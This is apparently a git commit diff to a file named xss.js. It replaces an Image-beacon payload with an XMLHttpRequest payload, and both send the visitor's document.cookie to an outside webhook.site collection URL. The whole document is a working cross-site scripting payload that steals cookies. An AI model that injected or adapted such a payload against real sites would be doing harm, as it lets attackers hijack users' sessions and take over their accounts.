ac04a5a985928eeb3c116af8d39f283b48bde10f
zhudmy <144657867+zhudmy@users.noreply.github.com>
2024-04-13 13:51:00 +0300

    change request

--- xss.js
+++ xss.js
@@ -1,2 +1,3 @@
-x = new Image();
-x.src = 'https://webhook.site/#!/view/556c6ea7-01f7-4969-b082-8464c4e9a2cf?data='+btoa(document.cookie);
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://webhook.site/556c6ea7-01f7-4969-b082-8464c4e9a2cf/?' + document.cookie, true);
+xhttp.send();
